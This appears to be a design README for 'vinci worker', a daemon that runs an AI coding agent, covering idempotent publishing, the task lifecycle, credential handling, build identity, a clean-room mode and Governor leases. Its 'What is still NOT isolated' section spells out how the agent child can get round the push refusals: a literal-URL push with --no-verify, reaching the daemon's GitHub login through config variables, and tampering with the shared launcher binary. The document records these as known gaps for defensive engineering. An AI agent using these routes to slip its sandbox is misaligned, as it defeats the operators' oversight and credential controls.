handoff's `message_id` is not a valid task id, which refuses before the body is read); prose-form
posts never carry the tag.

## Publishing

Publishing (`vinci/worker/publisher.mjs`,
`publish({ repoDir, branch, taskId, attempt, baseRef, limitTripped, promotion, fence?, repoOwner? })`)
is the only step that mutates the outside world, so every effect is keyed, conditional, and
re-runnable. `run.mjs`'s `publish()` is a thin wrapper: it maps `BLOCKER.md` at HEAD and
`evidence: none` to `promotion: "none"` (push, never a PR) and passes the envelope's `base_ref`
and repo owner through. The one command runner (`exec.mjs`, stdout + stderr preserved) is shared
with the rest of the daemon.

**Idempotency keys: branch + task.** One branch never owns two PRs. Before touching origin the
publisher lists the open PRs for the branch (`gh pr list --head <branch> --state open --json
number,url,state,headRefOid,headRefName,baseRefName,headRepositoryOwner,body`) and ADOPTS one only
when it is provably ours: head repository owner == the origin owner (`gh pr list --head` also
matches same-named branches on forks), base == our `baseRef`, and either the body footer names
this task (`vinci-worker: task=<taskId> …`) or the PR's head is an ancestor-or-equal of our head
(a legacy PR without a footer, or a held PR this task continues via `branch:`). Any other open PR
on the branch ⇒ `publish: "pr_conflict"`: nothing pushed, nothing created. When `gh pr create`
still collides (the race between list and create) every state is listed: an open PR that is ours
is adopted, a closed/merged one ⇒ `pr_closed` (never a second PR on the branch).
The PR body ends with a machine-readable footer:
`vinci-worker: task=<taskId> attempt=<n> head=<sha> base=<baseRef>` (+ `fence=<generation>`
when a fence was supplied). The PR base is the caller's `baseRef` (`base_ref:` header); `main`
only when nothing was passed. **Until #23 threads `base_ref` through `prepareRepository`, the
daemon refuses any `base_ref` other than `main` before cloning (`BLOCKED`,
`base_ref_unsupported`)** — the branch is forked from `origin/main`, and a PR against another base
would not share its fork point.

**The never-force rule.** The sha to publish is captured once (`pushed_sha`) and origin is sampled
once (`remote_sha_before`, from `git ls-remote origin refs/heads/<branch>`). If origin holds a
commit that is not an ancestor of ours (an unfetched object counts), the push is refused before it
is attempted: `publish: "remote_moved"`. The push itself is a conditional update of the CAPTURED
sha, never of the mutable branch name:
`git push origin <pushed_sha>:refs/heads/<branch> --force-with-lease=refs/heads/<branch>:<remote_sha_before | empty>`
— a compare-and-swap against the sampled value (empty = the branch must not exist), not a force.
A move between the sample and the push is rejected by the lease and recorded as `remote_moved`
with `remote_sha_after`. After a push origin is read back and must equal `pushed_sha`
(`remote_readback_mismatch` otherwise). There is no force path; a moved remote is an operator
decision, never something a retry resolves.

**What is recorded** (task record / `result.json`):

| field | meaning |
|---|---|
| `publish` | `pushed` · `push_failed` · `remote_moved` · `remote_readback_mismatch` · `pr_conflict` · `pr_closed` · `fenced_out` · `blocked` (pushed, PR suppressed by BLOCKER.md) |
| `pushed_sha` | the exact local sha that was pushed (null when nothing was pushed) |
| `remote_sha_before` / `remote_sha_after` | origin's sha for the branch sampled before the push / read back after it (null = absent) |
| `push_skipped` | `remote_at_head` when origin already held our sha (a retry after a crash between push and PR record) |
| `pr` / `pr_adopted` / `pr_adopted_via` / `pr_head` | the PR URL (only when its head == `pushed_sha`; `pr_head_mismatch` in `pr_error` otherwise); adopted vs created; `footer` / `ancestry` / `continuation`; the PR head |
| `refusal_reason` / `pr_conflicts` | why a refusal happened |
| `fenced_out` | the fence's reason when it declined an effect |
| `base_ref` | the PR base actually used |

**Crash windows.** The push and the PR record are two effects. `pushed_sha` is recorded as soon
as the push succeeds, so a failure in `gh pr create` leaves `publish: "pushed", pr: null` with the
sha on the record; the next attempt finds origin at that sha (no push attempt at all) and adopts
the PR that was created out-of-band, or creates exactly one.

**Fence.** An optional `fence: { generation?, check: async ({ stage }) => ({ valid, reason }) }`
is consulted immediately before the push and again immediately before PR creation. `valid: false`
— or a check that throws — skips that effect and records `fenced_out: <reason>`; a fence that
fails before the push leaves nothing on origin. The hook point is `processHandoff(…, { fence, cleanRoom })`
in `worker.mjs`. **#26 wires it**: under `--governor` the daemon builds this attempt's fence over
its work-order lease (`fence.check` is the lease `check` call with the bus token) and passes it to
`publish()`, so every governed push and PR is fenced. `fence.generation` is a **getter** over the
live lease, not a captured value — the object outlives the acquire and is read again at PR-creation
time, and a fence carrying a generation that has gone stale is a fence that passes when it should
not. Ungoverned runs still pass `null` and are byte-for-byte the unfenced path.

## Lifecycle

State file `<state-dir>/tasks/<id>.json`:

```json
{
  "task": "128",
  "attempt": 1,
  "session_id": "128",
  "state": "COMPLETED",
  "started_at": "2026-08-26T12:00:00.000Z",
  "finished_at": "2026-08-26T12:15:00.000Z",
  "exit_code": 0,
  "head": "abc1234567890def",
  "pr": "https://github.com/...",
  "pr_adopted": false,
  "publish": "pushed",
  "pushed_sha": "abc1234567890def",
  "remote_sha_before": null,
  "base_ref": "main",
  "evidence": "pr",
  "limit_tripped": null,
  "harness_stop": null,
  "vinci_version": "0.42.0",
  "worker_build": { "version": "0.42.0", "commit": "<40-hex>", "dirty": false },
  "server_build": { "git_sha": "<40-hex>", "dirty": false },
  "vinci_binary": { "version": "0.42.1", "path": "/home/worker/.local/bin/vinci" },
  "provider": "openrouter",
  "model": "z-ai/glm-5.2",
  "cost_usd": 2.15,
  "terminal": true,
  "lease": { "claimed_at": "...", "paths": ["."], "ttl": 3600, "effective_max_runtime_s": 3600 },
  "evidence_error": null,
  "evidence_result_state": "COMPLETED"
}
```

`harness_stop` is `{ "count": <stops>, "reason": "<first stop text>" }` whenever a harness stop occurred in the session, regardless of final state (a FAILED run's blocker post also carries `harness_stops=<N> harness_stop_reason=<first stop text>`, distinct from `reason=`, which stays the outcome narrative); it decides the state (row 2 above) only when nothing outranks it. `null` when no stop occurred.

**Transition table** (enforced by `TaskLifecycle.transition`; anything not listed throws
`illegal transition <from> → <to>`, and unknown state names throw):

| From | To | When |
|------|----|------|
| `PENDING` | `RUNNING` | immediately before the `vinci` child is spawned |
| `PENDING` | `BLOCKED`, `FAILED` | fail-fast before spawn: envelope error, past deadline, Governor refusal/error |
| `RUNNING` | `COMPLETED`, `UNVERIFIED`, `BLOCKED`, `FAILED` | the run finished, the branch was published, and the evidence bundle was attempted |
| any terminal | (nothing) | a finished task is immutable; a failure after the terminal write (e.g. the final bus post) surfaces to the daemon loop instead of rewriting the record |

Field-only updates (Governor lease, run results before publish) go through `record()` and never
change `state`. `RUNNING` is non-terminal, so a daemon that dies mid-run resumes the task on
restart exactly as before.

**Evidence before terminal:** the terminal state is written only *after* the evidence bundle was
attempted. The daemon computes the intended final state, builds the exact snapshot it is about to
commit, ships that snapshot as `result.json` (marked `"snapshot": "pre-terminal"`,
`"committed_state": null`, `"terminal": false` — a bundle never asserts a committed state; the
task file records `evidence_result_state`, the state the bundle names, so a post-upload downgrade
is machine-detectable as `evidence_result_state !== state`), and only then transitions. If evidence is configured
(`VINCI_EVIDENCE_URI_PREFIX` set) and either the S3 upload or the `/v1/evidence` metadata POST
fails, `COMPLETED` is downgraded to `UNVERIFIED` and `evidence_error` records the failure;
`BLOCKED`/`FAILED` keep their state but still record `evidence_error`. When evidence is not
configured nothing changes (no downgrade), so soak boxes may run without it.

**Restart behavior:**
- If `terminal=true`: skip (already done)
- If `terminal=false` (`PENDING`/`RUNNING`): increment `attempt`, keep same `session_id`, resume

## Credentials

- `VINCI_BUS_TOKEN`: Bearer auth to bus (/v1/messages)
- `VINCI_GOVERNOR_TOKEN`: Session auth to the Governor; required whenever `--governor` is set (a task with a Governor URL and no token is BLOCKED, never run)
- `VINCI_DECLARATION_REFRESH_S`: how often (seconds) a governed daemon re-posts its capability declaration; default `21600` (6h), and anything that is not a positive number falls back to the default. It must stay comfortably below the Governor's `VGC_DECLARATION_MAX_AGE_S` (default 86400), which is when a declaration expires and admission starts answering `eligible: false, reason: stale_declaration`. **The default is chosen against row retention, not liveness** (gpu-control §32): the Governor's `worker_declarations` table is append-only with a DELETE trigger and every refresh writes an audit row, so the volume cannot be pruned later. 6h keeps four refreshes inside the 24h window — three consecutive failed re-posts can be absorbed before one goes stale — at a quarter the rows of hourly, which buys no liveness at all
- `GH_TOKEN`: (optional) GitHub machine user token for cloning/pushing private repos and creating PRs
- `OPENROUTER_API_KEY`: (or provider-specific key) via vinci's standard configuration
- `VINCI_QWEN_BASE_URL` + `VINCI_QWEN_SECRET_REF=file:/absolute/private/path`: direct Qwen endpoint
  and worker-only credential-file reference; the worker converts the reference to child descriptor
  3 and removes it before spawn. Never place the credential value in worker configuration

Never hardcode. Use systemd SecureString parameters, AWS Secrets Manager, or similar.

## Dependencies

Minimal:
- Node 22+
- Global `fetch` (Node 22)
- Git
- `gh` CLI (for PR operations)
- `vinci` binary on PATH

No new npm dependencies introduced; uses only node:* and global APIs.

## Logs and State

```
<state-dir>/
  cursor.json                    # High-water mark per worker
  tasks/
    <id>.json                    # Lifecycle record
  sessions/<id>/                 # vinci JSONL read for outcomes and usage (outside every tree)
  debris/<id>/                   # shared-checkout mode: quarantined leavings of a prior run
  repos/
    <name>/                      # shared-checkout mode (default): ONE tree per repo NAME
  cache/<org>/<repo>.git         # clean-room mode: one bare cache per org/repo
  attempts/<org>/<repo>/<id>/    # clean-room mode: one worktree per attempt (+ .home/.tmp/.hooks)
    <attempt>/
```

## Build identity (W0.5)

Build skew between the two worker boxes, and between a worker and the gpu-control server, has
already caused live failures, so every record names the exact build that produced it. Nothing
here gates startup: identity is a record, not a check.

What is recorded, and where:

- `worker_build` — computed ONCE at daemon start by `vinci/worker/build.mjs`
  (`buildIdentity()`): `{ version, commit, dirty, source, unresolved }`. `version` is
  `identity.json`'s version (the string task records always carried as `vinci_version`, which
  is kept); `commit` is the HEAD sha of the checkout the daemon runs from, read directly from
  the checkout's files — the `.git` at the package root ONLY (`<root>/vinci/worker/build.mjs`
  looks at `<root>/.git`; a `.git` further up belongs to some other repository and is treated
  as absent), `HEAD` (a `gitdir:` pointer file is followed for a linked worktree), then the
  branch's loose ref, then `packed-refs`, following symbolic refs recursively (at most 8 hops;
  a cycle, a ref name with `.`/`..`/empty segments, or a ref file that does not really live
  under the git dir resolves to nothing) — never via `git` exec, so an
  unprivileged daemon on a root-owned checkout still resolves it (#17: git's "dubious
  ownership" refusal used to silently degrade the identity to a version string). It is `null`
  when there is no `.git` entry at the package root (a packaged install: `source: "package"`,
  `unresolved: false`) OR when a `.git` entry exists there but HEAD could not be resolved —
  unborn branch, unreadable HEAD, malformed or dangling `gitdir:` pointer, symbolic-ref cycle
  (`source: "package"`, `unresolved: true`). `dirty` is whether
  `git -c safe.directory=<checkout root> status --porcelain --untracked-files=no` is non-empty
  (the exact root, which every git with `safe.directory` honours; the `*` wildcard needs
  >= 2.35.3); it is best-effort and `null` (unknown) whenever git is missing or refuses —
  never `false` by default.
- `server_build` — the verbatim payload of `GET <server>/v1/version` (unauthenticated;
  vinci-gpu-control reports `git_sha`, `dirty`, `server_code_sha256`, …), fetched once at
  daemon start with a 2 s timeout per attempt and ONE retry after 1 s on a timeout or network
  error (a cold first request has timed out and then answered in 43 ms on restart). Anything the
  server actually answered — non-2xx, a non-JSON or non-object body — is recorded on the first
  attempt and not retried. Worst case 5 s, so a hung server cannot delay the first
  poll past 6 s. On any failure it is `{ "error": "<why>", "attempts": <n> }` and the daemon
  still starts.
- `vinci_binary` (#18) — `{ version, path }` from running `<vinci on PATH> --version`
  (`vinciBinaryVersion()` in `build.mjs`; the binary is resolved exactly the way `runVinci`
  resolves the one it spawns; 10 s timeout; the answer must be one `x.y.z[-pre]` token or it
  is recorded as `unparseable version: …`). The probe runs under a minimal environment —
  `PATH`, `HOME`, `TMPDIR`, `LANG` and `VINCI_UPDATE_DISABLED=1` only — never the daemon's,
  which carries the bus/Governor tokens and provider/GitHub/AWS credentials. This is the
  launcher payload that actually runs tasks and it is legitimately different from
  `worker_build`: the daemon runs from a checkout, the launcher is updated on its own. It is
  probed at daemon start (the `online` post's value) AND immediately before every spawn —
  after the Governor lease and the clone — and that pre-spawn value is what the task record
  carries. On any failure it is `{ "error": "<why>" }` and the daemon still starts.
- Post-incident rule (the release that could not launch): **a task never runs under a self-updating launcher.** `runVinci` spawns
  with `VINCI_UPDATE_DISABLED=1`, so nothing can swap the payload between the pre-spawn probe
  and the run — the recorded `vinci_binary` is the executed binary by construction. Updating
  the launcher on a worker box is an operator action (`vinci update`, as the deploy recipe
  already does), never something a task triggers.
- `vinci_version` is kept for compatibility and is the DAEMON CHECKOUT's `identity.json`
  version (identical to `worker_build.version`). It is NOT the version of the binary that ran
  the task — the incident that motivated this was a task record naming the daemon checkout's
  version on a box whose launcher had already been updated to the next release. Read
  `vinci_binary` for that.
- All of them are written into the task record (`<state-dir>/tasks/<id>.json`) by `startAttempt`:
  `worker_build` is stored as `{ version, commit, dirty }` (`source` is omitted) and
  `server_build` as the payload verbatim (or `{ error }`), `vinci_binary` as `{ version, path }`
  (or `{ error }`). The task record is what ships as the evidence bundle's `result.json`, so the
  same fields appear there.
- Every terminal bus post — the final post from a run AND the early blockers (envelope error,
  past deadline, governor refusal/unavailability) — carries `worker_build=…` and
  `vinci_binary=…` via one shared formatter in `worker.mjs` (`terminalPostBody`).
- The bus sees them twice: the daemon's single `worker <id> online` status post at start
  (`worker_build=<build>[-dirty] worker_version=<version>
  server_build=<server commit | unknown: <error>> vinci_binary=<version | unknown: <error>>`,
  posted once per start, before the first
  poll, in `--once` mode too; a daemon that refuses to start — lock held, exit 75, or missing
  Governor, exit 78 — never announces itself and never fetches `/v1/version`), and
  `worker_build=<build>[-dirty] vinci_binary=<…>` on every terminal task post. `<build>` is the 40-hex commit
  for a resolved checkout, the bare `<version>` only for a packaged install (no `.git`), and
  the explicit `<version>-UNRESOLVED` for a checkout whose HEAD could not be read — a bare
  version on a machine that runs from a checkout is a defect, never a fallback, and must not be
  mistakable for a resolved identity.
- Drift signal: the last ANNOUNCED binary is persisted in `<state-dir>/vinci-binary.json`.
  Whenever a probe (at start or before a spawn) returns a version different from it, the
  daemon posts ONE `status` `worker <id> vinci binary changed <old> -> <new>` and only then
  updates the file — so a failed post is retried before the next task or at the next start,
  and a change that lands while the daemon is down is still announced exactly once. Only
  version -> version changes are announced (A -> B -> A is two); a probe `{ error }` is
  recorded on the task but never announced and never resets the last-announced value. The
  first successful probe on a box is the baseline and is not announced. A cohort with such a
  post in it ran on two binaries.

The post-fix soak requires ONE exact build set: both worker boxes must show the same
`worker_build` (no `-dirty`), the same `server_build` AND the same `vinci_binary=` in their
`online` posts before the cohort counts, and no `vinci binary changed` post may appear while it
runs. A cohort whose task records carry two different `worker_build` or `vinci_binary` values
is two cohorts.

## Clean room (`--clean-room`, W1; default OFF this wave)

What the default (shared-checkout) mode did in soak cohort 2: one working tree per
repo **name** under `<state-dir>/repos/<name>`, reused across attempts, tasks and orgs; stale local
branches from an earlier attempt blocked a real continuation (rows 11/11b); the quarantine copies a
prior run's residue aside (`debris/`) but the tree stays shared. Provider hardening now applies on
this path too: `VINCI_WORKER_ALLOWED_PROVIDERS` is checked before clone, non-selected provider
credential variables are removed, and the child resolves stored auth from a task-specific empty
agent slot rather than the daemon's shared `auth.json`. The rest of the daemon environment is still
inherited, including GitHub, bus, Governor and AWS credentials; publishing happens in the daemon
after the run, but a same-uid child is not an isolation boundary.

`--clean-room` (`vinci/worker/cleanroom.mjs`) replaces the shared things with per-attempt ones. It
flips on by default after the chaos gate; until then it is opt-in and the shared-checkout path is
byte-for-byte what it was.

| | shared checkout (default) | clean room (`--clean-room`) |
|---|---|---|
| Repository cache | none: the tree IS the clone | `<state-dir>/cache/<org>/<repo>.git`, one bare cache per **org/repo**, all heads fetched (pruned) before every attempt; its origin URL is checked on every reuse, so `a/repo` and `b/repo` can never share one |
| Working tree | `<state-dir>/repos/<name>`, keyed by name only, reused by every attempt, task and org | `<state-dir>/attempts/<org>/<repo>/<task>/<attempt>/`, a fresh `git worktree add --detach <base>` for **every** attempt, never reused (a dir that already exists is an error) |
| Base of an attempt | whatever the shared tree was left at; a stale local branch is fast-forwarded, refused, or renamed aside | `origin/<branch>` for a `branch:` envelope; otherwise `origin/worker/<task>` **when origin already has it** (attempt N published, then crashed or was resumed) and `origin/main` only when it does not — so attempt N+1's publish is a fast-forward, never a rejected non-fast-forward. Recorded as `base_commit` / `cache_ref` on the task. A previous attempt's local branch is renamed aside under `stale/…` in the cache (`stale_ref`), never deleted; if it holds commits that are NOT on `origin/worker/<task>`, the attempt is refused with shared mode's divergence reason (never-pushed residue is renamed aside first, the retry continues at `origin/worker/<task>`) — nothing is ever forced |
| A crashed attempt | its residue is quarantined into `debris/` by the NEXT task | its dir is sealed read-only as evidence when the next attempt starts, and never re-entered; the resume of a RUNNING task is attempt N+1 in a new dir |
| Child environment | daemon env minus every known non-selected provider credential; provider is also gated by `VINCI_WORKER_ALLOWED_PROVIDERS` before clone/spawn. GitHub, bus, Governor and AWS credentials still pass through | an **allowlist** (below): no bus/Governor/GitHub/AWS credentials, only the provider key the envelope names; the daemon's agent slot (`VINCI_CODING_AGENT_DIR` / `PI_CODING_AGENT_DIR`) never passes through |
| Child HOME / TMPDIR | the daemon's; both agent-dir variables point at `<state-dir>/provider-slots/<task>/<attempt>/<provider>`, so automatic auth resolution cannot use the daemon's shared `auth.json` or a prior attempt's stored login | `<attempt>.home/` and `<attempt>.tmp/` beside the tree (never inside it, so they are neither in `git status` nor in the evidence diff); the child's agent slot is `<attempt>.home/agent`, empty unless `VINCI_WORKER_AUTH_FILE` opts one credential file in (below) |
| `git push` from inside | works, with the daemon's credentials | the **default publish path is dead**, in the worktree AND in the bare cache (the `git-common-dir` every worktree can name): `remote.origin.pushurl=/dev/null` refuses `git push`, `git push origin`, `git push --no-verify origin` and `git -C <cache> push origin`; a `core.hooksPath` pre-push hook that exits 1 refuses `git push <literal url>`. This removes the **ambient** credentials and the default path; it does **not** stop a same-uid child that supplies its own — `git push --no-verify <literal url>` and `git remote add x <url> && git push --no-verify x` reach origin whenever the transport needs no credential the child lacks. See "What is still NOT isolated" |
| Publishing | `git push` from the tree, `gh pr create` in the tree | `git push --no-verify <origin url> refs/heads/<branch>` **from the bare cache**, under the daemon's env (the literal URL sidesteps the cache's dead pushurl, `--no-verify` its hook — `-c remote.origin.pushurl=…` would not: pushurl is multi-valued, `-c` appends, and git still tries `/dev/null` first); `gh pr create -R <org>/<repo>` (no tree needed). The branch ref is shared between cache and worktree, so nothing is fetched, copied, unset or re-set anywhere to publish — the child never holds a working push at any point, and the cache's refusal is intact after every publish. **Capability rollback, not a variant:** this path is a fork of the PRE-#25 publisher. None of the standard publisher's guarantees apply here — no Governor fence, no remote-sha sample with `--force-with-lease`, no push read-back, no `alreadyOnRemote` idempotent retry (which is exactly #25's crash-window guarantee, and the crash window was MEASURED in this mode), no foreign-PR refusal, and no PR-head verification. **Today `fence` is null on every path** (nothing constructs one yet), so a `--governor --clean-room` run is NOT refused: it runs and publishes through this fork with none of the guarantees above. Once the lease loop (#26) supplies a fence, that combination is refused before the model is spawned (`clean_room_publish_unsupported`) rather than published under guarantees that are not in force. The fix is to route this mode through `publisher.publish()` with `repoDir = cacheDir`, threading the cache's own pushurl/hooks refusal — not to teach this fork a fence. |
| Bounds | none | refuse to start an attempt when `<state-dir>` has less than `--disk-floor-mb` free (`0` disables the floor, on the flag and on `VINCI_WORKER_DISK_FLOOR_MB` alike; an unparsable or negative value refuses to start); keep the newest `--keep-attempts` (3) **evidence-uploaded** attempt dirs per task and prune older uploaded ones — never the newest, never the running one, and **never a dir without its `<attempt>.evidence_uploaded` marker** (a crashed or never-uploaded attempt's sealed dir is the only evidence there is, so it is not prunable by count; with no evidence configured nothing is ever pruned) |
| Task record | as before | plus `attempt_dir`, `cache_ref`, `base_commit`, `stale_ref` |
| Sessions, debris, evidence bundle | outside the tree | unchanged, outside the tree |

**The child's environment (exact allowlist).** Copied verbatim from the daemon when set:
`PATH`, `LANG`, `VINCI_ENV`, `VINCI_BASE_URL`, `VINCI_PLATFORM_URL`, `VINCI_NO_BOOTSTRAP_HEAL`,
`VINCI_TOOL_BOOTSTRAP`, `VINCI_SHOW_OTHER_PROVIDERS`, `VINCI_SOURCE_CLI`, and the Qwen
endpoint/worker-only secret-reference/qualification/circuit settings above — the variables
`vinci/bin/vinci` and the install shim read to find the backend and the run mode. Plus **only** the
key the envelope's `provider:` authenticates with: `OPENROUTER_API_KEY` for `openrouter`,
`VINCI_API_KEY` for `vinci`, `VINCI_INTERNAL_DEEPINFRA_API_KEY` for `deepinfra` (an unknown provider
gets no key and the launcher refuses it, as today). `qwen-h200` carries no credential value through
the allowlist; immediately before spawn the worker replaces its narrow file reference with inherited
descriptor 3, and the extension consumes that descriptor during bootstrap. Set by the daemon, never copied: `HOME` and
`TMPDIR` (per attempt), `VINCI_CODING_AGENT_DIR` and `PI_CODING_AGENT_DIR` (both spellings, both
`<attempt>.home/agent` — the daemon's own slot is **not** passed through: it holds `auth.json` for
every provider, every prior session and `bin/`), `VINCI_HOME` (the launcher's install root — the
shim derives it from `HOME`, which is now the empty per-attempt one, so it is passed explicitly from
the daemon's `VINCI_HOME` or `<daemon HOME>/.vinci-code`), `VINCI_UPDATE_DISABLED=1`. **Everything
else is dropped**, in particular `VINCI_BUS_TOKEN`, `VINCI_GOVERNOR_TOKEN`, `GH_TOKEN`, `AWS_*`,
`VINCI_EVIDENCE_URI_PREFIX` and every other provider's key.

**Giving the child a login (`VINCI_WORKER_AUTH_FILE`).** A task that authenticates through a
stored login rather than a provider key needs an `auth.json` in the child's slot, and the slot is
empty by construction. The narrow opt-in is `VINCI_WORKER_AUTH_FILE=<path>` in the daemon's
environment: before the spawn the clean room copies **that one file** (mode 0600) to
`<attempt>.home/agent/auth.json` — nothing else from the daemon's slot, no sessions, no `bin/`. A
set-but-missing path fails the attempt with `VINCI_WORKER_AUTH_FILE … does not exist` rather than
running it logged out. Prefer a file that holds only the provider the envelope names. Because the child's `HOME` has no `~/.gitconfig`, the attempt
worktree carries the daemon's `user.name`/`user.email` (or `vinci-worker <worker@vinci.invalid>`) in
its worktree config, so the agent's commits work; and `~/.vinci-code.env` is NOT sourced for the
child (a profile is a place to put secrets) — put what the child needs in the daemon's environment.

**What is still NOT isolated — say it plainly.** The clean room is a guardrail against the
measured failures (shared trees, stale branches, credential inheritance, pushing from inside), not
a security boundary:

- **No container, no VM, no user separation.** The child runs as the daemon's uid on the daemon's
  box. It can read the daemon's files (state dir, sessions, other attempts' trees, the cache), and
  it can run `git config --unset remote.origin.pushurl` or edit the hooks. The push refusals
  remove the **default publish path**, nothing more. Verified open from inside an attempt
  (`vinci/test/worker-clean-room.mjs` asserts each bypass's status, so closing one flips a test
  deliberately): `git push --no-verify <literal url> HEAD:refs/heads/x` succeeds, and so does
  `git remote add x <url> && git push --no-verify x` — a URL on the command line has no pushurl
  and `--no-verify` skips the hook. `git -C "$(git rev-parse --git-common-dir)" push origin` (the
  cache, i.e. the daemon's own publish path) is refused since the cache carries the same
  refusals. What decides whether an open bypass lands is the **transport's credential**, and that
  boundary is **HOME-keyed, not uid-keyed**: the clean room withholds the ambient env credentials
  and gives the child an empty HOME, but a same-uid child can point `GH_CONFIG_DIR` or
  `GIT_CONFIG_GLOBAL` at the daemon's HOME and reach the daemon's `gh auth` login or credential
  helper; an SSH agent socket or an instance profile is reachable regardless of HOME; and on
  **macOS the boundary is absent** — Apple git's system gitconfig sets
  `credential.helper=osxkeychain` for every HOME, so any credential in the keychain is the
  child's. A real boundary is a separate uid or a container; until then treat "push from inside
  refused" as a guardrail against accidents, not against intent.
- **`VINCI_HOME` is writable by the child.** The launcher's install root (`versions/`,
  `updater/`) is passed explicitly and shared with the daemon; a child can modify the binary the
  NEXT attempt runs under (`VINCI_UPDATE_DISABLED=1` stops the updater, not a write). Mitigation to
  come: a read-only bind of `VINCI_HOME` or a separate uid; until then the recorded
  `vinci_binary` version on every task is the tripwire, not a guard.
- **No network allowlist.** The child can reach anything the box can reach.
- **No CPU, memory or process limits** beyond the existing runtime/budget/deadline kills.
- **Disk and retention are bounds, not quotas.** The floor refuses to START an attempt; it does not
  stop a running one from filling the disk.

Verified by `vinci/test/worker-clean-room.mjs` (real git; two attempts ⇒ two dirs and the first kept
sealed; two tasks on one repo ⇒ no shared tree; `a/repo` vs `b/repo` ⇒ distinct caches; the
allowlist with five planted secrets, end to end through the daemon; `git push` from inside refused
on the default path — worktree and cache — while the daemon's publish still lands the branch and the
PR, and the two open bypasses asserted open; attempt N+1 continuing at `origin/worker/<task>` after
attempt N published, and the divergence refusal; the agent-slot cut-off and the one-file auth
opt-in; marker-gated retention; the disk floor and the `0`/unparsable env values) and by the
existing worker suite with the flag off.

## Network Access

- Outbound HTTPS to bus (`--server`)
- Outbound HTTPS to GitHub (clone, fetch, push, PR operations)
- NO inbound network required
- Runs with `--tools read,grep,find,ls,bash,edit,write` only (no network tools)

## See Also

- vinci-gpu-control: docs/CONTRACT.md §16 (bus message contract)
- vinci-code-cli: vinci/bin/vinci (main CLI, commands like `worker start`)

## Stage 2: Authority and Governance (Optional)

Stage 2 adds two opt-in hooks that enforce resource governance and audit trails. Both are inactive unless their environment variables are set; workers without Stage 2 configuration behave identically to Stage 1.

### Governor Lease (fail-closed)

The Governor is configured by `--governor <url>` plus the `VINCI_GOVERNOR_TOKEN` env. Once a
Governor URL is configured, **the only thing that lets a task clone a repository or spawn a
model is a granted lease.** There is no fail-open path. Exactly these rules apply:

1. **When to claim**: after the work-order lease below is granted (Wave 1B: lease first, because the Governor has no endpoint that releases a path claim, so a claim must never be held for a lease the worker does not get) and before the repository is cloned and `vinci -p` is spawned, the daemon calls `POST {governor}/v1/governor/claim-paths` with the task's claim path(s) (envelope header `claim:`, default `.`), `Authorization: Session <token>`, `Idempotency-Key: <task-id>/<attempt>`, and — required — `attempt_id` in the body, the SAME `<task-id>/<attempt>` string the lease acquire sent. The Governor's holder gate refuses any claim on a leased work order whose `attempt_id` is not the current holder's, and an absent `attempt_id` fails that comparison too; since the lease is acquired first, a claim without it would be refused `403 leased_by_other_attempt` for every governed task — blocked by a lease this very worker holds. The daemon computes the attempt id once and passes it to both calls; it is never derived twice. A missing `attempt_id` fails closed client-side (`claim attempt_id is missing`) rather than being sent.
2. **URL set, token missing**: the task is **BLOCKED** with reason `lease_unavailable: governor token missing (VINCI_GOVERNOR_TOKEN)` (the lease acquire is the first thing that needs the token), a `blocker` is posted (`Governor lease unavailable:`), and the Governor is not contacted. The task never runs ungoverned.
3. **Governor unreachable, network error, body that is not a JSON object, or any HTTP status other than 2xx / 403 / 409 / 422**: the task is **BLOCKED**; the reason carries the status or the error (`Governor connection failed: ECONNREFUSED`, `Governor returned invalid JSON (status 200): ...`, `Governor returned a malformed body (status 200): ...`, `Governor error: unexpected status 500 ...`). When the path claim is what failed, the blocker post is prefixed `Governor unavailable/invalid:` and the task snapshot records `outcome.governor = "unavailable"`; the lease held for it is released `blocked`. (An unreachable Governor is seen first by the lease acquire, whose blocker reads `Governor lease unavailable: lease_unavailable: Governor connection failed: ...` — same classification, no lease and no claim held.) Never "proceed".
4. **Refusal (403 / 409 / 422)**: the task is **BLOCKED**; the blocker post is prefixed `Governor refused the lease:` followed by the Governor's `reason` text verbatim, the snapshot records `outcome.governor = "refused"`, and the work-order lease held for the claim is released `blocked`. Refusal and unavailability are never conflated.
5. **Granted (200)**: a 200 is a lease only if its body is a JSON object whose `ttl` is a JSON number that is finite and greater than 0. **Known cross-repo disagreement:** the deployed server does not send `ttl` at all — its 200 body is `{ok, reason, claim_hash, paths}` (`app.py:2888-2893`) even though the handler computes the ttl and passes it into `governor_runtime.claim_paths` — so against today's server every governed task blocks here at `Governor lease invalid: ttl=undefined`. The server fix is dispatched on gpu-control #201; the client requirement stays, because the claim ttl is a runtime cap (rule 6) and accepting a ttl-less claim would silently delete it. Both sides are pinned by tests (`worker-lease-loop.mjs`: "claim-paths without ttl (the DEPLOYED server shape) blocks before any work" / "claim-paths WITH ttl (the fixed server) runs"). There is no default ttl: `0`, negative, a string such as `"60"`, `null`, or a missing `ttl` ⇒ **BLOCKED** with reason `Governor lease invalid: ttl=<value>` (no clone, no spawn). A valid lease (`claimed_at`, `paths`, `ttl`, and any `budget_usd` / `max_runtime_s` / `deadline` from the work order) is recorded in the lifecycle's `lease` field, and the limits are tightened before the run starts.
6. **Lease TTL is enforced**: the run's effective `max_runtime_s` is `min(envelope max_runtime_s, work-order max_runtime_s, lease ttl seconds)`; because every granted lease carries a validated ttl, the runtime timer that sends SIGTERM (then SIGKILL after the grace period) always fires no later than the lease ttl after the model is spawned. Time spent cloning before the spawn is not counted against the ttl. The value actually used is recorded as `lease.effective_max_runtime_s` in the task snapshot. Smaller `budget_usd` and earlier `deadline` from the work order also replace the envelope's.

**Requiring a Governor.** By default the daemon still starts without `--governor` (the production Governor canary is currently off; Wave 1 flips this default). To make an ungoverned start impossible today, pass `--require-governor` or set `VINCI_WORKER_REQUIRE_GOVERNOR=1`: if no `--governor <url>` is configured the daemon refuses to start, writes the reason to stderr, and exits with code **78** (`EX_CONFIG`). This is the first check after option parsing — it runs before the `VINCI_BUS_TOKEN` check, before the daemon lock is taken (an existing `daemon.lock` is not read or touched), and before any bus request — so the exit code is 78 regardless of what else is missing.

**Deployment prerequisite:** Governor URL must be reachable only from inside the dev-box network; Stage 2 boxes need network access to the local listener. Token is never logged or exposed.

### Work-order lease loop (Wave 1B)

With `--governor` set, every task holds a **work-order lease** (`vinci/worker/lease.mjs`) from before the path claim until its terminal state; without `--governor` none of this runs and the daemon is byte-identical to before. All lease calls go to `<governor>/v1/governor/leases…` with `Authorization: Session <VINCI_GOVERNOR_TOKEN>`, except `check`, which uses the bus token. Every lease request is bounded by a 10 s timeout (`LEASE_TIMEOUT_MS`): a Governor that accepts the connection and never answers is `Governor connection failed: timeout after 10000 ms` — the same class as a refused connection, so a hang can never hold a heartbeat, a fence or a release open.

